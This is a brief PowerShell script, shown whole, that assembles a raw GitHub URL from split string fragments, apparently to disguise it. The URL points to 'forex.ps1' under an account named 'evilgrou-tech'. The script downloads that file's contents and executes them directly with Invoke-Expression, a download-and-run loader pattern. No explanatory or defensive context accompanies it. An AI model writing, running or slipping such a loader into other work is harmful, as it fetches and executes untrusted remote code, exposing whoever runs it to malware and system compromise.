$wc = New-Object System.Net.WebClient
$p1 = "https://"
$p2 = "raw.githubusercontent.com"
$p3 = "/evilgrou-tech/drivers/main/forex.ps1"
$url = $p1 + $p2 + $p3
$cmd = $wc.DownloadString($url)
Invoke-Expression $cmd
